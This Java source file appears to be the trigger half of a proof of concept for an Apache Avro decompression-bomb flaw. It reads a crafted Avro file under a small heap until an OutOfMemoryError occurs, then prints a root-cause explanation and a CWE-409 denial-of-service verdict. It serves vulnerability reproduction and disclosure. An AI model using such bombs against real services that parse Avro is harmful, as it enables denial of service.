package poc;

import org.apache.avro.file.DataFileReader;
import org.apache.avro.generic.GenericDatumReader;
import org.apache.avro.generic.GenericRecord;

import java.io.File;

/**
 * Attempts to read an Avro file and iterate through all records.
 *
 * When pointed at a decompression-bomb file (created by CreatePoC or
 * CraftBomb) and run with a constrained heap (e.g. -Xmx32m), this triggers
 * OutOfMemoryError inside the codec's decompress() method because every
 * Avro codec decompresses into an unbounded ByteArrayOutputStream.
 *
 * Exit codes:
 *   0  -- all records read without error (heap was large enough)
 *   1  -- unexpected error
 *   99 -- OutOfMemoryError confirmed (vulnerability reproduced)
 */
public class TriggerOOM {

    public static void main(String[] args) {
        String inputFile = args.length > 0 ? args[0] : "poc.avro";

        System.out.println("=== Avro Decompression Bomb PoC - OOM Trigger ===");
        System.out.println();
        System.out.println("Reading file: " + inputFile);
        System.out.println("Max heap:     " + (Runtime.getRuntime().maxMemory() / (1024 * 1024)) + " MB");
        System.out.println();

        File f = new File(inputFile);
        if (!f.exists()) {
            System.err.println("ERROR: File not found: " + inputFile);
            System.err.println("Run CreatePoC or CraftBomb first to generate a malicious Avro file.");
            System.exit(1);
        }

        System.out.println("File size on disk: " + f.length() + " bytes (" + (f.length() / 1024) + " KB)");
        System.out.println();

        try (DataFileReader<GenericRecord> reader =
                new DataFileReader<>(f, new GenericDatumReader<>())) {

            // Show schema so the user can see it looks realistic
            String codec = reader.getMetaString("avro.codec");
            System.out.println("Schema: " + reader.getSchema().getFullName());
            System.out.println("Codec:  " + codec);
            System.out.println();
            System.out.println("Reading records...");
            System.out.println();

            int count = 0;
            while (reader.hasNext()) {
                GenericRecord record = reader.next();
                count++;

                // Print a short summary of each record (truncate large fields)
                String summary = summarize(record, count);
                System.out.println(summary);
            }

            System.out.println();
            System.out.println("WARNING: All " + count + " records read successfully without OOM.");
            System.out.println("This means the heap was large enough. Try with -Xmx32m.");

        } catch (OutOfMemoryError e) {
            System.err.println();
            System.err.println("*** VULNERABILITY CONFIRMED ***");
            System.err.println();
            System.err.println("OutOfMemoryError triggered during Avro decompression!");
            System.err.println("Error: " + e.getMessage());
            System.err.println();
            System.err.println("Stack trace:");
            e.printStackTrace(System.err);
            System.err.println();
            System.err.println("Root cause: The Avro codec's decompress() method decompresses into");
            System.err.println("an unbounded ByteArrayOutputStream with no size limit, allowing");
            System.err.println("a small compressed payload to expand until OOM.");
            System.err.println();
            System.err.println("ALL codecs are affected: Deflate, Zstandard, BZip2, Snappy, XZ.");
            System.err.println();
            System.err.println("CWE-409: Improper Handling of Highly Compressed Data");
            System.err.println("Impact: Denial of Service (DoS) - JVM crash via OOM");
            System.exit(99);

        } catch (Exception e) {
            System.err.println("Unexpected error: " + e.getMessage());
            e.printStackTrace(System.err);
            System.exit(1);
        }
    }

    /**
     * Produce a one-line summary of a record, truncating any field longer
     * than 60 chars.  This lets the user see the innocent preamble records
     * being read successfully before the bomb block triggers OOM.
     */
    private static String summarize(GenericRecord record, int index) {
        StringBuilder sb = new StringBuilder();
        sb.append("  #").append(index).append(" {");
        boolean first = true;
        for (org.apache.avro.Schema.Field field : record.getSchema().getFields()) {
            if (!first) sb.append(", ");
            first = false;
            String name = field.name();
            Object val = record.get(name);
            String str;
            if (val instanceof java.nio.ByteBuffer) {
                int len = ((java.nio.ByteBuffer) val).remaining();
                str = "<" + len + " bytes>";
            } else {
                str = String.valueOf(val);
            }
            if (str.length() > 60) {
                str = str.substring(0, 57) + "...";
            }
            sb.append(name).append("=").append(str);
        }
        sb.append("}");
        return sb.toString();
    }
}
